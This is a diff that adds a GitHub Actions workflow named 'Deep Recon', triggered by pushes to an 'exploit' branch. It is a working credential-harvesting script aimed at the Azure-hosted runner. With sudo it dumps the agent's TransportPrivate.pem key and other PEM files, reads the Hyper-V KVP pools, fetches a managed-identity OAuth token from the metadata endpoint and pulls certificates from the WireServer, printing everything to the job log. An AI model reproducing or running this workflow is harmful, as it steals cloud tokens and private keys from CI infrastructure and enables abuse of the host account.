@@ -1,0 +1,42 @@
+name: Deep Recon
+on:
+  push:
+    branches: [exploit]
+    paths: ['.github/workflows/recon.yml']
+  workflow_dispatch:
+jobs:
+  recon:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Deep Recon
+        run: |
+          set +e
+          echo "=== TRANSPORT KEY ==="
+          sudo cat /var/lib/waagent/TransportPrivate.pem 2>/dev/null || echo "NO KEY FOUND"
+          echo ""
+          echo "=== WAAGENT DIR ==="
+          sudo ls -la /var/lib/waagent/ 2>/dev/null | head -50
+          echo ""
+          echo "=== PEM FILES ==="
+          sudo find /var/lib/waagent -name "*.pem" -exec echo {} \; 2>/dev/null
+          echo ""
+          echo "=== KVP0 ==="
+          sudo strings /var/lib/hyperv/.kvp_pool_0 2>/dev/null | head -40
+          echo ""
+          echo "=== KVP3 ==="
+          sudo strings /var/lib/hyperv/.kvp_pool_3 2>/dev/null | head -40
+          echo ""
+          echo "=== IMDS IDENTITY ==="
+          curl -sH "Metadata:true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
+          echo ""
+          echo "=== WIRESERVER CERTS ==="
+          GS=$(curl -s http://168.63.129.16/machine?comp=goalstate -H "x-ms-version: 2012-11-30")
+          CONT=$(echo "$GS" | sed -n 's/.*<ContainerId>\(.*\)<\/ContainerId>.*/\1/p')
+          INST=$(echo "$GS" | sed -n 's/.*<InstanceId>\(.*\)<\/InstanceId>.*/\1/p' | head -1)
+          echo "Container=$CONT Instance=$INST"
+          curl -s "http://168.63.129.16/machine/$CONT/$INST?comp=certificates&incarnation=1" -H "x-ms-version: 2012-11-30" | head -50
+          echo ""
+          echo "=== NETWORK ==="
+          ip addr show | grep "inet "
+          ip route
+          echo "=== DONE ==="
